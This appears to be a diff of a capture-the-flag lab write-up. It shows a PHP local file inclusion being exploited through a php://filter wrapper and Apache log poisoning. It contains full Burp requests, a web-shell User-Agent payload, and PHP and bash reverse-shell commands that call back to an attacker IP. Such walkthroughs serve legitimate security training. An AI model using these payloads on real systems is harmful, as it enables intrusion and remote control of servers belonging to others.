@@ -4,6 +4,30 @@
 Bypass the filter with `PayLoadsAllTheThings`
 [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)
 We get the `dog.php` and `cat.php`. Tried to get the `index.php`
+Payload burp
+```burp
+GET /?view=php://filter/convert.base64-encode/resource=dog/../index HTTP/1.1
+
+Host: 10.10.80.48
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://10.10.80.48/
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Cache-Control: max-age=0
+
+```
+
 
 ```html
 <!DOCTYPE HTML>
@@ -76,4 +100,38 @@ Upgrade-Insecure-Requests: 1
 ```
 
 
-php -r '$sock=fsockopen("10.17.7.26", 1234);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+php -r '$sock=fsockopen("10.17.7.26",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+
+We need to url encode the payload
+
+[https://www.functions-online.com/urlencode.html](https://www.functions-online.com/urlencode.html)
+
+So the Burp request become like this
+```Burp
+GET /?view=dog../../../../../../var/log/apache2/access.log&ext=&cmd=php+-r+%27%24sock%3Dfsockopen%28%2210.17.7.26%22%2C1234%29%3B%24proc%3Dproc_open%28%22%2Fbin%2Fbash+-i%22%2C+array%280%3D%3E%24sock%2C+1%3D%3E%24sock%2C+2%3D%3E%24sock%29%2C%24pipes%29%3B%27 HTTP/1.1
+
+Host: 10.10.80.48
+
+User-Agent: <?php system($_GET['cmd']); ?>
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://10.10.80.48/
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Cache-Control: max-age=0
+```
+__Note__: You need to excute at lease 2 times so the code take effect (parse).
+Return to our reverse terminal, now we have shell.
+
+
+
+"bash -i >& /dev/tcp/10.17.7.26/1235 0>&1"
